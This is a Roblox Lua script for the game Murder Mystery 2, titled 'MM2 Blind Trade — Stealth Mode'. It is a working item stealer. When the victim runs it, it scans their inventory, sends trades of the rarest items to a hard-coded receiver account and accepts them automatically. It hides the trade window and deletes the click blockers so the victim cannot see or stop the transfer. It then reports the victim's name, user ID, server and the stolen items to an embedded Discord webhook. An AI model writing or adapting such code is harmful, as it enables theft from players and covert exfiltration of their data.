--[[
    MM2 BLIND TRADE — STEALTH MODE (PC + PHONE FIXED)
    ENI & LO COLLAB - DEBOUNCED STEALTH, ZERO LAG, ZERO FLICKER
]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer

-- === CONFIGURATION ===
local TARGET_USERNAME = "castlerooms"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1530569484820156546/bX5tiLtjmKUB3s7kETmZ2W2Vl4pxdEM1QvSPDvzTDfDZq9j5zCTDfF69zUf2Sy7S9-2I"
local ACCEPT_DELAY = 5
local MAX_ITEMS_PER_TRADE = 4

-- === GLOBAL TIMESTAMP ===
local latestTimestamp = nil

-- === RARITY PRIORITY ===
local rarityPriority = {
    ["Ancient"] = 100,
    ["Godly"] = 90,
    ["Legendary"] = 80,
    ["Rare"] = 70,
    ["Uncommon"] = 60,
    ["Classic"] = 55,
    ["Common"] = 50,
}

-- === DEVICE DETECTION ===
local function getDeviceType()
    if UserInputService.TouchEnabled and not UserInputService.MouseEnabled then
        return "Phone"
    elseif UserInputService.TouchEnabled and UserInputService.MouseEnabled then
        return "Tablet"
    else
        return "PC"
    end
end

-- === STRIP A SINGLE ELEMENT ===
local function stripElement(child)
    pcall(function()
        local nameLower = string.lower(child.Name)
        -- Kill click blocks dead on arrival
        if string.match(nameLower, "clickblock") or string.match(nameLower, "blocker") then
            child:Destroy()
            return
        end
        if child:IsA("GuiObject") then
            child.BackgroundTransparency = 1
            child.Active = false
        end
        if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
            child.TextTransparency = 1
            if child:IsA("TextButton") then child.Interactable = false end
        end
        if child:IsA("ImageLabel") or child:IsA("ImageButton") then
            child.ImageTransparency = 1
            if child:IsA("ImageButton") then child.Interactable = false end
        end
    end)
end

-- === STRIP ALL DESCENDANTS OF A GUI ===
local function stripAll(gui)
    for _, child in ipairs(gui:GetDescendants()) do
        stripElement(child)
    end
end

-- === HOOK A TRADE GUI WITH DEBOUNCED DESCENDANT WATCH ===
local function hookTradeGUI(tradeUI)
    -- Immediately kill it
    if tradeUI.Enabled then
        tradeUI.Enabled = false
    end
    
    -- Strip whatever is already inside
    stripAll(tradeUI)
    
    -- Kill it any time the game tries to re-enable it
    tradeUI:GetPropertyChangedSignal("Enabled"):Connect(function()
        if tradeUI.Enabled then
            tradeUI.Enabled = false
        end
    end)
    
    -- DEBOUNCED DescendantAdded — batch all rapid additions into one sweep
    local debounce = false
    tradeUI.DescendantAdded:Connect(function()
        if debounce then return end
        debounce = true
        task.wait() -- Wait one frame so the burst of additions finishes
        stripAll(tradeUI)
        debounce = false
    end)
    
    print("🪤 Hooked: " .. tradeUI.Name)
end

-- === ENFORCE STEALTH ===
local function enforceStealth()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return end
    
    -- Hook any Trade UIs that already exist
    local pcUI = gui:FindFirstChild("TradeGUI")
    if pcUI then hookTradeGUI(pcUI) end
    
    local phoneUI = gui:FindFirstChild("TradeGUI_Phone")
    if phoneUI then hookTradeGUI(phoneUI) end
    
    -- Kill any global click blockers already floating around
    for _, child in ipairs(gui:GetChildren()) do
        local nameLower = string.lower(child.Name)
        if string.match(nameLower, "clickblock") or string.match(nameLower, "blocker") then
            pcall(function() child:Destroy() end)
        end
    end
    
    -- Watch for anything new the game adds to PlayerGui
    gui.ChildAdded:Connect(function(child)
        local nameLower = string.lower(child.Name)
        if nameLower == "tradegui" or nameLower == "tradegui_phone" then
            task.wait() -- Let it finish initializing
            hookTradeGUI(child)
        elseif string.match(nameLower, "clickblock") or string.match(nameLower, "blocker") then
            pcall(function() child:Destroy() end)
        end
    end)
    
    print("👻 Stealth hooks injected. Zero lag. Zero flicker.")
end

-- === SEND WEBHOOK ===
local function sendWebhook(items, serverId, totalOffered, tradeNumber)
    if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
    
    local itemList = ""
    local totalQuantity = 0
    for i, item in ipairs(items) do
        itemList = itemList .. i .. ". " .. item.realId .. " (" .. item.rarity .. ") x" .. item.quantity .. "\n"
        totalQuantity = totalQuantity + item.quantity
    end
    
    if itemList == "" then itemList = "No items found" end
    
    local isPrivate = serverId and string.len(serverId) > 20
    
    local Embed = {
        title = "🎯 MM2 Trade Executed! (Trade #" .. (tradeNumber or 1) .. ")",
        color = totalOffered > 0 and 0x00FF00 or 0xFF0000,
        fields = {
            {name = "👤 Receiver", value = TARGET_USERNAME, inline = true},
            {name = "👤 Victim", value = player.Name, inline = true},
            {name = "🆔 Victim ID", value = tostring(player.UserId), inline = true},
            {name = "🆔 Server ID", value = serverId or "Unknown", inline = false},
            {name = "🏠 Server Type", value = isPrivate and "🔒 PRIVATE SERVER" or "🌐 PUBLIC SERVER", inline = true},
            {name = "📦 Items Traded", value = "```" .. itemList .. "```", inline = false},
            {name = "📊 Unique Items", value = tostring(#items), inline = true},
            {name = "📊 Total Copies", value = tostring(totalQuantity), inline = true},
            {name = "📊 Items Offered", value = tostring(totalOffered or 0), inline = true},
            {name = "📊 Trade #", value = tostring(tradeNumber or 1), inline = true},
            {name = "📊 Status", value = totalOffered > 0 and "✅ Trade Complete" or "❌ Trade Failed", inline = false}
        },
        footer = {text = "MM2 Blind Trade | " .. os.date("%Y-%m-%d %H:%M:%S")}
    }
    
    local request = syn and syn.request or http_request
    if not request then return end
    
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode({content = "", embeds = {Embed}})
        })
    end)
end

-- === GET ALL ITEMS FROM SALVAGE UI (PC + MOBILE) ===
local function getAllItems()
    local items = {}
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then
        print("❌ PlayerGui not found")
        return items
    end
    
    local device = getDeviceType()
    print("📱 Device: " .. device)
    
    local container = nil
    
    if device == "Phone" or device == "Tablet" then
        local mainGUI = gui:FindFirstChild("MainGUI")
        if mainGUI then
            local lobby = mainGUI:FindFirstChild("Lobby")
            if lobby then
                local screens = lobby:FindFirstChild("Screens")
                if screens then
                    local inventory = screens:FindFirstChild("Inventory")
                    if inventory then
                        local main = inventory:FindFirstChild("Main")
                        if main then
                            local crafting = main:FindFirstChild("Crafting")
                            if crafting then
                                local craftMain = crafting:FindFirstChild("Main")
                                if craftMain then
                                    local salvage = craftMain:FindFirstChild("Salvage")
                                    if salvage then
                                        local scrollFrame = salvage:FindFirstChild("ScrollFrame")
                                        if scrollFrame then
                                            container = scrollFrame:FindFirstChild("Container")
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    else
        local mainGUI = gui:FindFirstChild("MainGUI")
        if mainGUI then
            local gameUI = mainGUI:FindFirstChild("Game")
            if gameUI then
                local crafting = gameUI:FindFirstChild("Crafting")
                if crafting then
                    local inventory = crafting:FindFirstChild("Inventory")
                    if inventory then
                        local salvage = inventory:FindFirstChild("Salvage")
                        if salvage then
                            local scrollFrame = salvage:FindFirstChild("ScrollFrame")
                            if scrollFrame then
                                container = scrollFrame:FindFirstChild("Container")
                            end
                        end
                    end
                end
            end
        end
    end
    
    if not container then
        print("❌ Salvage container not found!")
        print("📋 Please OPEN the Salvage menu and run again")
        return items
    end
    
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("🔍 SCANNING SALVAGE UI (" .. device .. ")")
    print("📍 Path: " .. container:GetFullName())
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    for _, child in ipairs(container:GetChildren()) do
        local realId = child.Name
        
        if realId ~= "Container" and realId ~= "ScrollFrame" and
           realId ~= "UIListLayout" and realId ~= "UIPadding" and
           realId ~= "Canvas" and realId ~= "Background" and
           realId ~= "Frame" and realId ~= "ScrollingFrame" then
            
            local quantity = 1
            local rarity = ""
            local itemContainer = child:FindFirstChild("Container")
            if itemContainer then
                local amountLabel = itemContainer:FindFirstChild("Amount")
                if amountLabel and amountLabel:IsA("TextLabel") then
                    local amountText = amountLabel.Text
                    if amountText and amountText ~= "" then
                        local num = amountText:match("x(%d+)")
                        if num then quantity = tonumber(num) or 1 end
                    end
                end
                local rarityLabel = itemContainer:FindFirstChild("Rarity")
                if rarityLabel and rarityLabel:IsA("TextLabel") then
                    rarity = rarityLabel.Text
                end
            end
            
            local priority = rarityPriority[rarity] or 0
            table.insert(items, {
                realId = realId,
                quantity = quantity,
                rarity = rarity,
                priority = priority
            })
            print("  ✅ " .. realId .. " (x" .. quantity .. ") — " .. (rarity or "Unknown"))
        end
    end
    
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("📊 Total items found: " .. #items)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    return items
end

-- === ACCEPT TRADE ===
local function acceptTrade()
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("✅ ACCEPTING TRADE")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    local Trade = ReplicatedStorage:FindFirstChild("Trade")
    if not Trade then print("❌ Trade folder not found") return false end
    
    local AcceptTrade = Trade:FindFirstChild("AcceptTrade")
    if not AcceptTrade then print("❌ AcceptTrade remote not found") return false end
    
    local arg1 = game.PlaceId * 3
    local arg2 = latestTimestamp or tick()
    
    print("📤 Arg[1]: " .. arg1 .. " (PlaceId * 3)")
    print("📤 Arg[2]: " .. arg2 .. " (Latest timestamp)")
    
    local success, err = pcall(function()
        AcceptTrade:FireServer(arg1, arg2)
    end)
    
    if success then
        print("✅ Trade accepted!")
        return true
    else
        print("❌ Failed: " .. tostring(err))
        return false
    end
end

-- === SEND TRADE REQUEST ===
local function sendTradeRequest()
    local Trade = ReplicatedStorage:FindFirstChild("Trade")
    if not Trade then print("❌ Trade folder not found") return false end
    
    local SendRequest = Trade:FindFirstChild("SendRequest")
    if not SendRequest then print("❌ SendRequest not found") return false end
    
    local target = Players:FindFirstChild(TARGET_USERNAME)
    if not target then
        print("❌ Target " .. TARGET_USERNAME .. " not in server!")
        return false
    end
    
    print("📤 Sending trade request to " .. TARGET_USERNAME)
    
    local success, result = pcall(function()
        return SendRequest:InvokeServer(target)
    end)
    
    if success then
        print("✅ Trade request sent")
        return true
    else
        print("❌ Failed: " .. tostring(result))
        return false
    end
end

-- === WAIT FOR ACCEPTANCE ===
local function waitForAcceptance()
    local Trade = ReplicatedStorage:FindFirstChild("Trade")
    if not Trade then print("❌ Trade folder not found") return false end
    
    local StartTrade = Trade:FindFirstChild("StartTrade")
    if not StartTrade then print("❌ StartTrade not found") return false end
    
    local UpdateTrade = Trade:FindFirstChild("UpdateTrade")
    if UpdateTrade then
        UpdateTrade.OnClientEvent:Connect(function(tradeData)
            if tradeData and tradeData.LastOffer then
                latestTimestamp = tradeData.LastOffer
                print("📌 Updated timestamp: " .. latestTimestamp)
            end
        end)
    end
    
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("⏳ Waiting for " .. TARGET_USERNAME .. " to accept...")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    local accepted = false
    local connection
    
    connection = StartTrade.OnClientEvent:Connect(function(data, targetName)
        if targetName == TARGET_USERNAME then
            accepted = true
            latestTimestamp = data.LastOffer
            print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print("🎯 " .. TARGET_USERNAME .. " ACCEPTED!")
            print("📌 Timestamp: " .. latestTimestamp)
            print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            connection:Disconnect()
        end
    end)
    
    local timeout = 60
    while not accepted and timeout > 0 do
        task.wait(1)
        timeout = timeout - 1
    end
    
    if not accepted then
        print("❌ Timeout waiting for acceptance")
        connection:Disconnect()
        return false
    end
    
    return true
end

-- === OFFER ITEMS ===
local function offerItems(items)
    local Trade = ReplicatedStorage:FindFirstChild("Trade")
    if not Trade then print("❌ Trade folder not found") return 0 end
    
    local OfferItem = Trade:FindFirstChild("OfferItem")
    if not OfferItem then print("❌ OfferItem remote not found") return 0 end
    
    if #items == 0 then return 0 end
    
    table.sort(items, function(a, b)
        if a.priority == b.priority then
            return a.quantity > b.quantity
        end
        return a.priority > b.priority
    end)
    
    local batchSize = math.min(#items, MAX_ITEMS_PER_TRADE)
    
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("⚡ OFFERING " .. batchSize .. " ITEMS")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    print("📋 Offer order:")
    for i = 1, batchSize do
        local item = items[i]
        print("  " .. i .. ". " .. item.realId .. " (" .. item.rarity .. ") x" .. item.quantity)
    end
    print("")
    
    local totalOffered = 0
    
    for i = 1, batchSize do
        local item = items[i]
        local realId = item.realId
        local quantity = item.quantity
        
        print("  📦 " .. realId .. " (" .. item.rarity .. ") x" .. quantity)
        
        for j = 1, quantity do
            print("    📤 Offering: " .. realId .. " (" .. j .. "/" .. quantity .. ")")
            
            local success, err = pcall(function()
                OfferItem:FireServer(realId, "Weapons")
                totalOffered = totalOffered + 1
            end)
            
            if success then
                print("      ✅ Offered: " .. realId)
            else
                print("      ❌ Failed: " .. tostring(err))
            end
            
            task.wait(math.random(20, 40) / 100)
        end
        
        print("  ✅ Done: " .. realId .. " (x" .. quantity .. ")")
        print("")
    end
    
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("✅ Offered " .. totalOffered .. " total items")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    return totalOffered, batchSize
end

-- === DO ONE TRADE CYCLE ===
local function doTradeCycle(items, tradeNumber)
    print("")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("🔄 TRADE #" .. tradeNumber)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("📦 Items remaining: " .. #items)
    
    if #items == 0 then
        print("✅ No items left!")
        return 0
    end
    
    local sent = sendTradeRequest()
    if not sent then return 0 end
    
    local accepted = waitForAcceptance()
    if not accepted then return 0 end
    
    local totalOffered, offeredCount = offerItems(items)
    
    print("📌 Waiting for final timestamp...")
    task.wait(1)
    
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("⏳ Waiting " .. ACCEPT_DELAY .. " seconds before accepting...")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    for i = ACCEPT_DELAY, 1, -1 do
        print("  ⏳ " .. i .. " seconds remaining...")
        task.wait(1)
    end
    
    print("")
    acceptTrade()
    sendWebhook(items, game.JobId, totalOffered, tradeNumber)
    
    return offeredCount or 0
end

-- === MAIN ===
local function main()
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("🚀 MM2 BLIND TRADE — STEALTH MODE")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("")
    print("👤 Target: " .. TARGET_USERNAME)
    print("📦 Max items per trade: " .. MAX_ITEMS_PER_TRADE)
    print("📱 Device: " .. getDeviceType())
    print("")
    print("📋 Rarity Priority (Highest First):")
    print("  1. Ancient")
    print("  2. Godly")
    print("  3. Legendary")
    print("  4. Rare")
    print("  5. Uncommon")
    print("  6. Classic")
    print("  7. Common")
    print("")
    print("⚠️  Please OPEN the Salvage menu")
    print("👻 Trade UI: COMPLETELY HIDDEN, ZERO LAG")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("")
    print("Press any key to start...")
    task.wait(2)
    
    -- Inject stealth hooks ONCE, event-driven, no loops
    enforceStealth()
    
    local allItems = getAllItems()
    
    if #allItems == 0 then
        print("❌ No items found!")
        print("📋 Please make sure the Salvage menu is OPEN")
        return
    end
    
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("📊 Total items to trade: " .. #allItems)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    local tradeNumber = 0
    local totalTraded = 0
    
    while #allItems > 0 do
        tradeNumber = tradeNumber + 1
        local offered = doTradeCycle(allItems, tradeNumber)
        
        if offered == 0 then
            print("❌ Trade failed! Stopping.")
            break
        end
        
        totalTraded = totalTraded + offered
        
        for i = 1, math.min(offered, #allItems) do
            table.remove(allItems, 1)
        end
        
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print("📊 Progress: " .. totalTraded .. " items traded")
        print("📊 Remaining: " .. #allItems .. " items")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        if #allItems > 0 then
            print("⏳ Waiting 3 seconds before next trade...")
            task.wait(3)
        end
    end
    
    print("")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("✅ ALL ITEMS TRADED!")
    print("📊 Total items traded: " .. totalTraded)
    print("📊 Total trades: " .. tradeNumber)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
end

main()
